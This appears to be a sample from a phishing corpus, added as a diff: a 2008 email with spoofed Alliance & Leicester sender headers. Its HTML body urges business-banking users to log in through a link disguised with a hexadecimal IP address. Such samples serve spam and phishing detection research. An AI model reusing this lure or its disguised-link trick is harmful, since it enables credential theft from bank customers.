@@ -1,0 +1,42 @@
+x-sender: security@alliance-leicester.co.uk
+x-receiver: sarina.stokes@jupiterdisplay.com
+X-SCL: 7 71.98%
+Received: from th-india.com ([125.22.13.105]) by jup-svr09.SGL.GROUP with Microsoft SMTPSVC(6.0.3790.3959);
+	 Wed, 9 Apr 2008 20:19:22 +0100
+Received: (qmail 30393 invoked by uid 113); 9 Apr 2008 18:00:32 -0000
+Received: from 85.159.104.250 by mailserver (envelope-from <security@alliance-leicester.co.uk>, uid 107) with qmail-scanner-1.25st 
+ (clamdscan: 0.88.6/6672. spamassassin: 3.1.7. perlscan: 1.25st.  
+ Clear:RC:1(85.159.104.250):. 
+ Processed in 0.415653 secs); 09 Apr 2008 18:00:32 -0000
+Received: from host-85-159-104-250.dol.sk (HELO User) (ftpuser@[85.159.104.250])
+          (envelope-sender <security@alliance-leicester.co.uk>)
+          by th-india.com (qmail-ldap-1.03) with SMTP
+          for <sarimcquality@weber-insurance.com>; 9 Apr 2008 18:00:32 -0000
+From: "Alliance-Leicester"<security@alliance-leicester.co.uk>
+Subject: You have 1 new ALERT message
+Date: Wed, 9 Apr 2008 21:06:49 +0300
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+X-deepOfix-Mail-Filter-Message-ID: <120776403295530387@mailserver>
+Bcc:
+Return-Path: security@alliance-leicester.co.uk
+Message-ID: <JUP-SVR09pCc1aF6TXv00000976@jup-svr09.SGL.GROUP>
+X-OriginalArrivalTime: 09 Apr 2008 19:19:22.0595 (UTC) FILETIME=[9DE5A330:01C89A76]
+
+<HTML>
+<CENTER>
+<span>
+<p>Dear Alliance & Leicester Commercial Bank user, </p>
+<FONT face="verdana" size=2><B>You have 1 new ALERT message</B><BR>
+Please login to your <B>Alliance & Leicester Business Banking</B><BR> and visit the <B>Message Center</B> 
+section in order to read the message.<BR><BR>
+To Login, please click the link below:<BR><BR>
+<a href="http://0xCA295C83/www.mybusinessbank.co.uk" target="_blank">Go To Alliance & Leicester Business Banking Online</a></FONT><BR><BR>
+<font face="verdana" color="99999" size=1>&copy; 2007 Alliance & Leicester Commercial Bank. All rights reserved </FONT></CENTER>
+</HTML>
